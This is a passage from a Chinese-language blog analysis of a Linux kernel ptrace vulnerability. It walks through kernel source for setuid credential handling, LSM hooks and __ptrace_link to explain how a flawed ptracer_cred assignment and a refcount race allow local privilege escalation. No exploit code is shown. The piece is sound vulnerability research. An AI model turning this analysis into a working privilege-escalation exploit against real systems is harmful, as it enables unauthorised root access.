class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">bprm_fill_uid</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> linux_binprm *bprm)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mode;<br><span class="hljs-type">kuid_t</span> uid;<br><span class="hljs-type">kgid_t</span> gid;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Since this can be called multiple times (via prepare_binprm),</span><br><span class="hljs-comment"> * we must clear any previous work done when setting set[ug]id</span><br><span class="hljs-comment"> * bits from any earlier bprm-&gt;file uses (for example when run</span><br><span class="hljs-comment"> * first for a setuid script then again for its interpreter).</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">// 笔者注：首先使用原进程 euid egid</span><br>bprm-&gt;cred-&gt;euid = current_euid();<br>bprm-&gt;cred-&gt;egid = current_egid();<br><br><span class="hljs-keyword">if</span> (!mnt_may_suid(bprm-&gt;file-&gt;f_path.mnt))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (task_no_new_privs(current))<br><span class="hljs-keyword">return</span>;<br><br>inode = file_inode(bprm-&gt;file);<br>mode = READ_ONCE(inode-&gt;i_mode);<br><span class="hljs-keyword">if</span> (!(mode &amp; (S_ISUID|S_ISGID)))<br><span class="hljs-keyword">return</span>; <span class="hljs-comment">// 笔者注：不是 suid/sgid 程序，直接返回，否则将 euid/egid 设为文件 uid/gid</span><br><br><span class="hljs-comment">/* Be careful if suid/sgid is set */</span><br>inode_lock(inode);<br><br><span class="hljs-comment">/* reload atomically mode/uid/gid now that lock held */</span><br>mode = inode-&gt;i_mode;<br>uid = inode-&gt;i_uid;<br>gid = inode-&gt;i_gid;<br>inode_unlock(inode);<br><br><span class="hljs-comment">/* We ignore suid/sgid if there are no mappings for them in the ns */</span><br><span class="hljs-keyword">if</span> (!kuid_has_mapping(bprm-&gt;cred-&gt;user_ns, uid) ||<br> !kgid_has_mapping(bprm-&gt;cred-&gt;user_ns, gid))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (mode &amp; S_ISUID) &#123;<br>bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;<br>bprm-&gt;cred-&gt;euid = uid;<br>&#125;<br><br><span class="hljs-keyword">if</span> ((mode &amp; (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) &#123;<br>bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;<br>bprm-&gt;cred-&gt;egid = gid;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们注意到这样一个逻辑：当我们尝试运行一个 suid 程序时，其会将新进程的 cred-&gt;euid 设置为 suid 文件的 uid</p><p>那么如果我们 fork 出子进程运行 suid 程序、父进程再 ptrace attach 岂不就能直接完成提权了吗？答案是否定的，因为后面还会进行权限检查，我们继续跟踪调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_execve()<br>    do_execve()<br>    do_execveat_common()<br>    prepare_binprm()<br>    bprm_fill_uid()<br>    security_bprm_set_creds()<br></code></pre></td></tr></table></figure><p>该函数定义于 <code>security/security.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">security_bprm_set_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> linux_binprm *bprm)</span><br>&#123;<br><span class="hljs-keyword">return</span> call_int_hook(bprm_set_creds, <span class="hljs-number">0</span>, bprm);<br>&#125;<br></code></pre></td></tr></table></figure><p>虽然只有一个语句但解释起来可能有点复杂，这里我们要引入一个新的概念—— <code>Linux Security Modules</code>（LSM）</p><h3 id="Linux-Security-Modules">Linux Security Modules</h3><p>LSM 即 Linux 安全模组，类似于 VFS， 其提供了统一的安全业务逻辑接口，例如 SELinux 便是基于 LSM 实现的，整体框架如下：</p><p><img src="https://s2.loli.net/2022/01/12/f91geXREUiTyFSm.png" alt="偷的图.png"></p><blockquote><p>启用这个框架需要开启内核编译选项 <code>CONFIG_SECURITY</code>（默认开启）</p></blockquote><p>现在我们来剖析 <code>call_int_hook</code> 宏，该宏用于<strong>调用对应的 LSM 钩子</strong>，定义于 <code>/security/security.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> call_int_hook(FUNC, IRC, ...) (&#123;\</span><br><span class="hljs-meta">int RC = IRC;\</span><br><span class="hljs-meta">do &#123;\</span><br><span class="hljs-meta">struct security_hook_list *P;\</span><br><span class="hljs-meta">\</span><br><span class="hljs-meta">list_for_each_entry(P, &amp;security_hook_heads.FUNC, list) &#123; \</span><br><span class="hljs-meta">RC = P-&gt;hook.FUNC(__VA_ARGS__);\</span><br><span class="hljs-meta"><span class="hljs-keyword">if</span> (RC != 0)\</span><br><span class="hljs-meta">break;\</span><br><span class="hljs-meta">&#125;\</span><br><span class="hljs-meta">&#125; while (0);\</span><br><span class="hljs-meta">RC;\</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><p>其中 <code>list_for_each_entry</code> 是内核中常用遍历宏，这里不再赘叙，这里的 <code>security_hook_heads</code> 是一个<strong>全局结构体</strong>，阅读源码可以发现其中存放的都是内核双向链表结构，其实对应的应当是 <code>security_hook_list</code> 结构体，定义于 <code>/include/linux/lsm_hooks.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Security module hook list structure.</span><br><span class="hljs-comment"> * For use with generic list macros for common operations.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">security_hook_list</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>*<span class="hljs-title">head</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">security_list_options</span><span class="hljs-title">hook</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其中联合体 <code>security_list_options</code> 其实就是一个函数指针，不再赘叙，那么 <code>call_int_hook</code> 宏的作用就不言而喻了：调用 <code>security_hook_heads</code> 中对应成员的函数指针。我们也可以看出 <code>security_hook_heads</code> 结构体相当于一张函数表</p><p>这张函数表会在内核初始化时被初始化，这里我们将目光放到<strong>内核启动的初始化函数</strong>——<code>start_kernel()</code> 中，该函数定义于 <code>/init/main.c</code> 中，我们观察到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">asmlinkage __visible <span class="hljs-type">void</span> __init <span class="hljs-title function_">start_kernel</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    security_init();<br></code></pre></td></tr></table></figure><p>函数 <code>security_init()</code> 用以进行 LSM 的初始化，定义于 <code>/security/security.c</code> 中，观察到如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">security_init()<br>    capability_add_hooks()<br></code></pre></td></tr></table></figure><p>这里 <code>capability_add_hooks()</code> 逻辑比较简单，定义于 <code>/security/commoncap.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">security_hook_list</span> <span class="hljs-title">capability_hooks</span>[] =</span> &#123;<br>LSM_HOOK_INIT(capable, cap_capable),<br>LSM_HOOK_INIT(settime, cap_settime),<br>LSM_HOOK_INIT(ptrace_access_check, cap_ptrace_access_check),<br>LSM_HOOK_INIT(ptrace_traceme, cap_ptrace_traceme),<br>LSM_HOOK_INIT(capget, cap_capget),<br>LSM_HOOK_INIT(capset, cap_capset),<br>LSM_HOOK_INIT(bprm_set_creds, cap_bprm_set_creds),<br>LSM_HOOK_INIT(bprm_secureexec, cap_bprm_secureexec),<br>LSM_HOOK_INIT(inode_need_killpriv, cap_inode_need_killpriv),<br>LSM_HOOK_INIT(inode_killpriv, cap_inode_killpriv),<br>LSM_HOOK_INIT(mmap_addr, cap_mmap_addr),<br>LSM_HOOK_INIT(mmap_file, cap_mmap_file),<br>LSM_HOOK_INIT(task_fix_setuid, cap_task_fix_setuid),<br>LSM_HOOK_INIT(task_prctl, cap_task_prctl),<br>LSM_HOOK_INIT(task_setscheduler, cap_task_setscheduler),<br>LSM_HOOK_INIT(task_setioprio, cap_task_setioprio),<br>LSM_HOOK_INIT(task_setnice, cap_task_setnice),<br>LSM_HOOK_INIT(vm_enough_memory, cap_vm_enough_memory),<br>&#125;;<br><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">capability_add_hooks</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>security_add_hooks(capability_hooks, ARRAY_SIZE(capability_hooks));<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_SECURITY */</span></span><br></code></pre></td></tr></table></figure><p>这里 <code>security_add_hooks()</code> 函数定义于 <code>/include/linux/lsm_hooks.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">security_add_hooks</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> security_hook_list *hooks,</span><br><span class="hljs-params">      <span class="hljs-type">int</span> count)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; count; i++)<br>list_add_tail_rcu(&amp;hooks[i].<span class="hljs-built_in">list</span>, hooks[i].head);<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里整个逻辑就一目了然了，该函数表会根据表 <code>capability_hooks</code> 进行对应的初始化操作</p><h3 id="ptracer-权限检查">ptracer 权限检查</h3><p>现在让我们将目光放回 <code>security_bprm_set_creds()</code>函数，我们现在可以知道其调用的应当是 <code>security_hook_heads-&gt;bprm_set_creds-&gt;hook</code>，这个钩子指向函数 <code>cap_bprm_set_creds</code>，该函数定义于<code>/security/commoncap.c</code> 中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">cap_bprm_set_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> linux_binprm *bprm)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">old</span> =</span> current_cred();<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">new</span> =</span> bprm-&gt;cred;<br><span class="hljs-type">bool</span> effective, has_cap = <span class="hljs-literal">false</span>, is_setid;<br><span class="hljs-type">int</span> ret;<br><span class="hljs-type">kuid_t</span> root_uid;<br><br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-comment">// 笔者注：对被 ptrace 的 suid/sgid 进程进行权限检查</span><br>    <span class="hljs-comment">/* Don&#x27;t let someone trace a set[ug]id/setpcap binary with the revised</span><br><span class="hljs-comment"> * credentials unless they have the appropriate permit.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.</span><br><span class="hljs-comment"> */</span><br>is_setid = !uid_eq(new-&gt;euid, old-&gt;uid) || !gid_eq(new-&gt;egid, old-&gt;gid);<br><br><span class="hljs-keyword">if</span> ((is_setid || <span class="hljs-comment">// 是否为 suid/sgid</span><br>     !cap_issubset(new-&gt;cap_permitted, old-&gt;cap_permitted)) &amp;&amp;<br>    ((bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE) ||<br>     !ptracer_capable(current, new-&gt;user_ns))) &#123; <span class="hljs-comment">// 是否被 ptrace，若是，检查是否越权</span><br><span class="hljs-comment">/* downgrade; they get no more than they had, and maybe less */</span><br>        <span class="hljs-comment">//若检查出越权，则重新进行一次检查，进行降权</span><br><span class="hljs-keyword">if</span> (!ns_capable(new-&gt;user_ns, CAP_SETUID) ||<br>    (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;<br>new-&gt;euid = new-&gt;uid;<br>new-&gt;egid = new-&gt;gid;<br>&#125;<br>new-&gt;cap_permitted = cap_intersect(new-&gt;cap_permitted,<br>   old-&gt;cap_permitted);<br>&#125;<br><br>new-&gt;suid = new-&gt;fsuid = new-&gt;euid;<br>new-&gt;sgid = new-&gt;fsgid = new-&gt;egid;<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>其中 <code>ptracer_capable()</code> 定义于 <code>/kernel/capability.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ptracer_capable - Determine if the ptracer holds CAP_SYS_PTRACE in the namespace</span><br><span class="hljs-comment"> * @tsk: The task that may be ptraced</span><br><span class="hljs-comment"> * @ns: The user namespace to search for CAP_SYS_PTRACE in</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Return true if the task that is ptracing the current task had CAP_SYS_PTRACE</span><br><span class="hljs-comment"> * in the specified user namespace.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ptracer_capable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> user_namespace *ns)</span><br>&#123;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;  <span class="hljs-comment">/* An absent tracer adds no restrictions */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span>;</span><br>rcu_read_lock();<br>cred = rcu_dereference(tsk-&gt;ptracer_cred);<br><span class="hljs-keyword">if</span> (cred)<br>ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);<br>rcu_read_unlock();<br><span class="hljs-keyword">return</span> (ret == <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数检查了进程的 <code>ptracer_cred</code> 字段，若不为 NULL 则说明该进程为 ptracee，接下来使用 <code>security_capable_noaudit</code> 函数进行检查，该函数也是一个 LSM 钩子的 API，对应调用 <code>security_hook_heads-&gt;capable-&gt;hook</code>，对应函数为 <code>cap_capable()</code>，定义于 <code>/security/commoncap.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * cap_capable - Determine whether a task has a particular effective capability</span><br><span class="hljs-comment"> * @cred: The credentials to use</span><br><span class="hljs-comment"> * @ns:  The user namespace in which we need the capability</span><br><span class="hljs-comment"> * @cap: The capability to check for</span><br><span class="hljs-comment"> * @audit: Whether to write an audit message or not</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Determine whether the nominated task has the specified capability amongst</span><br><span class="hljs-comment"> * its effective set, returning 0 if it does, -ve if it does not.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * NOTE WELL: cap_has_capability() cannot be used like the kernel&#x27;s capable()</span><br><span class="hljs-comment"> * and has_capability() functions.  That is, it has the reverse semantics:</span><br><span class="hljs-comment"> * cap_has_capability() returns 0 when a task has a capability, but the</span><br><span class="hljs-comment"> * kernel&#x27;s capable() and has_capability() returns 1 for this case.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">cap_capable</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> cred *cred, <span class="hljs-keyword">struct</span> user_namespace *targ_ns,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cap, <span class="hljs-type">int</span> audit)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">ns</span> =</span> targ_ns;<br><br><span class="hljs-comment">/* See if cred has the capability in the target user namespace</span><br><span class="hljs-comment"> * by examining the target user namespace and all of the target</span><br><span class="hljs-comment"> * user namespace&#x27;s parents.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-comment">/* Do we have the necessary capabilities? */</span><br>        <span class="hljs-comment">// 若与 ptracer 同属同一命名空间，检查权限是否足够</span><br><span class="hljs-keyword">if</span> (ns == cred-&gt;user_ns)<br><span class="hljs-keyword">return</span> cap_raised(cred-&gt;cap_effective, cap) ? <span class="hljs-number">0</span> : -EPERM;<br><br><span class="hljs-comment">/* Have we tried all of the parent namespaces? */</span><br>        <span class="hljs-comment">// 自底向上遍历完了，说明检查出错，返回对应错误值</span><br><span class="hljs-keyword">if</span> (ns == &amp;init_user_ns)<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * The owner of the user namespace in the parent of the</span><br><span class="hljs-comment"> * user namespace has all caps.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 我们主要关注这里，这里会检查 ptracer_cred 的命名空间是否是新进程命名空间的父命名空间</span><br>        <span class="hljs-comment">// 若是，检查是否新进程命名空间的所有者是否与 ptracer 为同一用户</span><br>        <span class="hljs-comment">// 若是，返回 0，说明通过检查</span><br>        <span class="hljs-comment">// 若否，向上遍历命名空间，回到开头</span><br><span class="hljs-keyword">if</span> ((ns-&gt;parent == cred-&gt;user_ns) &amp;&amp; uid_eq(ns-&gt;owner, cred-&gt;euid))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If you have a capability in a parent user ns, then you have</span><br><span class="hljs-comment"> * it over all children user namespaces as well.</span><br><span class="hljs-comment"> */</span><br>ns = ns-&gt;parent;<br>&#125;<br><br><span class="hljs-comment">/* We never get here */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里会检查 ptracee 的命名空间所有者是否与 ptracer 为同一用户，<strong>只有这两者同属同一用户，检查才能通过，否则检查将不会通过，从而导致降权</strong></p><p>接下来的判断语句中调用的 <code>ns_capable()</code> 函数最终也会走到这个路径，这里便不再赘叙，感兴趣的可以自行检索阅读如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">ns_capable()<br>ns_capable_common()<br>        security_capable()<br>            cap_capable()<br></code></pre></td></tr></table></figure><p>由此我们得到结论：<strong>若 ptracee 进程执行 suid/sgid 程序，则检查 ptracee 保存的 ptracer 的 cred，即 ptracee 的 task_struct 的 ptracer_cred 字段的权限，若权限不足则 ptracee 以其自身的 euid/egid 执行程序，而非文件的 suid/sgid</strong></p><h2 id="LSM-与-ptracer-权限检查">LSM 与 ptracer 权限检查</h2><p>前面我们讲了对 ptracee 执行新程序的权限检查，现在我们来看对于 ptracer 操作的检查</p><p>将目光放回 ptrace 系统调用的源码中，对于 ptracer 的 <code>PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA</code> 这几个操作，会走入如下路径：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_ptrace()<br>    arch_ptrace()<br>    ptrace_request()<br>    generic_ptrace_peekdata() / generic_ptrace_pokedata()<br>    ptrace_access_vm()<br>    ptracer_capable()<br>    security_capable_noaudit()<br></code></pre></td></tr></table></figure><p>这里就又走回我们上面的路径了，不再重复分析，这里简单说明一点就是在 <code>ptrace_request()</code> 中传给下层被调函数的 task 参数为 ptracee 的 task_struct，在 <code>ptrace_access_vm()</code> 中传入的命名空间也为 ptracee 的 mm 的命名空间，因此<strong>最后权限判断还是根据 ptracee 进程的</strong> <code>ptracer_cred</code> <strong>字段</strong></p><h1>0x01.漏洞分析</h1><p>细心的读者或许已经观察到了，前面我们的预备知识中缺少了<strong>设置 ptracee 的 ptracer_cred 字段</strong>这一过程，实际上<strong>我们的漏洞便是出现在这个位置</strong></p><p>我们将目光重新放回 ptrace 系统调用的源码当中，当 ptracee 进程调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL);</code> 时，会走到如下路径：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_ptrace()<br>    ptrace_traceme()<br>    __ptrace_link()<br></code></pre></td></tr></table></figure><p>其中 <code>__ptrace_link()</code> 函数<strong>就是本次出现漏洞的函数</strong>，该函数用于建立 ptrace link，定义于 <code>/kernel/ptrace.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ptrace a task: make the debugger its new parent and</span><br><span class="hljs-comment"> * move it to the ptrace list.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with the tasklist lock write-held.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> __ptrace_link(<span class="hljs-keyword">struct</span> task_struct *child, <span class="hljs-keyword">struct</span> task_struct *new_parent)<br>&#123;<br>BUG_ON(!list_empty(&amp;child-&gt;ptrace_entry));<br>list_add(&amp;child-&gt;ptrace_entry, &amp;new_parent-&gt;ptraced);<br>child-&gt;parent = new_parent;<br>rcu_read_lock();<br>child-&gt;ptracer_cred = get_cred(__task_cred(new_parent));<br>rcu_read_unlock();<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数的功能比较简单，主要就是在 rcu 机制下将子进程的 <code>ptracer_cred</code> 字段设为<strong>父进程的 cred</strong>，这里的 <code>__task_cred()</code> 宏的作用主要是 rcu 机制下取得进程 real_cred，而 <code>get_cred()</code> 函数主要是将 cred 的引用计数 + 1</p><blockquote><p>RCU 机制即 ready-copy update ，该机制确保了多线程下读与写的同步，这里不详细介绍，原理可以简单理解为“节点更新”——读无限制，要写时先新建节点写入新节点，随后将节点更新到指针，这个过程中读者读的都是旧节点，随后等待读者退出，释放旧节点，新节点投入使用</p></blockquote><p>按照  Jann Horn 的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee">issue</a> 阐述，在这里存在着<strong>两个问题</strong>：</p><ul><li>竞态条件下导致错误的引用计数</li><li>ptracer_cred 设置的逻辑错误导致本地提权</li></ul><p>下面我们来逐一分析</p><h2 id="竞态条件下导致错误的引用计数">竞态条件下导致错误的引用计数</h2><p>在 <code>__ptrace_link()</code> 函数中调用了 <code>get_cred()</code> 函数获取父进程的 cred，该函数会将其引用计数 + 1，这看起来<strong>好像没有什么问题</strong>，不是么？我们引用了父进程的 cred，自然引用计数要 + 1，当 ptrace 流程结束后，引用计数再 - 1，这一切看起来似乎很正常</p><p>咋一看这个流程设计似乎是没有问题的，但在竞态条件下就不一定了，我们现在将目光放到一个对于 kernel pwner 而言或许都很熟悉但不一定曾深入研究过的一个函数——<code>commit_creds</code>，该函数定义于 <code>kernel/cred.c</code> 中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">commit_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> cred 